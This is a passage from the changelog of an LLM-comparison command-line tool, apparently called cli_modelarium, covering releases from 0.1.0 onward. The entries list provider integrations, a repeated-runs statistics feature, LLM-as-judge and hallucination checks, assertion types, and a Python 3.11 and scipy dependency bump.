  - `welch_t_test()`, `mann_whitney_u_test()`
  - `cohens_d()`, `cohens_d_interpretation()`
  - `bonferroni_correct()`, `holm_correct()`

### Changed

- `pyproject.toml`: `requires-python` bumped to `>=3.11`.
- `pyproject.toml`: classifiers updated - removed Python 3.10, added 3.13 and 3.14.
- `pyproject.toml`: `[tool.ruff].target-version` bumped to `py311`.
- `NOTICE`: added attributions for scipy, numpy, and the bundled native libraries (OpenBLAS, LAPACK, libquadmath).
- README: new "System Requirements" section and statistical-significance documentation.

### Fixed

- Resolved a latent inconsistency: `tests/test_jsonschema_optional.py` already imported `tomllib` (Python 3.11+ stdlib only) while the project declared 3.10 support. The Python bump retroactively fixes this.

### Dependencies

- Added: `scipy>=1.17,<2.0` (pulls `numpy>=1.26.4` as a transitive dependency).

## [0.1.1] - 2026-05-27

### Added

- `--runs N` flag on the `compare` command for statistical reproducibility analysis. Runs each (model, temperature, system_prompt) combination N times (1-100) and displays mean/median/stdev/CV of timing and tokens, cost totals, output frequency analysis, mode output, and output diversity.
- `--show-all-runs` flag to override the auto-collapse heuristic when many concurrent display panels would be created.
- New module `src/cli_modelarium/run_statistics.py` with `RunStats` dataclass and `compute_run_stats()` function for pure-stdlib statistical analysis.
- Hallucination rate calculation when `--check-hallucination` is combined with `--runs N`. Reports "N of M runs flagged as High risk" with the aggregate hallucination rate.
- Cost warning when `--runs N` is used without `--max-cost` (helps prevent unexpected spend).

### Changed

- `compare` command's display path branches when `runs > 1` to show statistical summary instead of per-run details. When `runs == 1` (default), behavior is byte-identical to v0.1.0.
- `run_streaming_comparison()` accepts new keyword parameters `runs: int = 1` and `show_all_runs: bool = False`. Default values preserve existing behavior.
- `StreamState` dataclass has new field `run_index: int = 0`. Default value preserves all existing test expectations.
- `BatchResult` dataclass has new field `run_index: int = 0`. Only emitted in CSV/JSON/Markdown output when the surrounding `runs` parameter > 1.
- Live streaming display auto-collapses when total concurrent tasks exceed 12 (configurable via `--show-all-runs`).
- LLM-as-judge with `--runs N`:
  - Default (with `--judge` or `--judges`): mode-only judging (one judge call per cell, expanded to every run in the cell)
  - With `--check-hallucination`: per-run judging (computes hallucination rate)
- JSON output schema additive when `runs > 1`: new `total_runs` and `stats_by_cell` top-level fields, plus `run_index` per result. When `runs == 1`, schema is byte-identical to v0.1.0.
- CSV output adds `run_index` column when `runs > 1`. When `runs == 1`, columns are unchanged.
- Markdown output adds a "Per-cell statistical summary" section when `runs > 1`. When `runs == 1`, output is unchanged.

### Fixed

- N/A (no bug fixes in this release; only additions)

## [0.1.0] - 2026-05-25

### Added

- Initial v0.1.0 release
- 8 cloud provider integrations: OpenAI, Anthropic, Google, xAI, DeepSeek, Mistral, Groq, OpenRouter
- Local model support: Ollama, LM Studio, vLLM, llama.cpp via OpenAI-compatible API
- Parallel streaming with TTFT (Time To First Token) tracking
- Multi-prompt batch mode with CSV, JSON, and Markdown output formats
- System prompt support: single, multiple (comparison), and file-based
- LLM-as-a-judge scoring with panel mode and self-evaluation skip
- Deterministic assertions with 10 types (`contains`, `not_contains`, `regex`, `equals`, `json_valid`, `json_schema`, `min_length_chars`, `max_length_chars`, `latency_under`, `cost_under`)
- CI/CD exit codes: 0 = success, 1 = assertion failure, 2 = call failure (call failures dominate)
- Hallucination detection preset with optional reference facts and worst-wins panel aggregation
- OS-native keychain integration via `keyring`
- API key format validation for 8 providers
- Error message redaction prevents key leakage
- Localhost-only validation for local model URLs
- Cross-platform support: macOS, Windows 10+/ARM, Linux
- Rate limit handling: 429 retry with exponential backoff, 529 (Anthropic overloaded) with longer backoff
- `retry-after` header honored when present
- Per-provider semaphores for concurrent request management
- Atomic file writes for output integrity
- Apache 2.0 License with proper NOTICE attribution
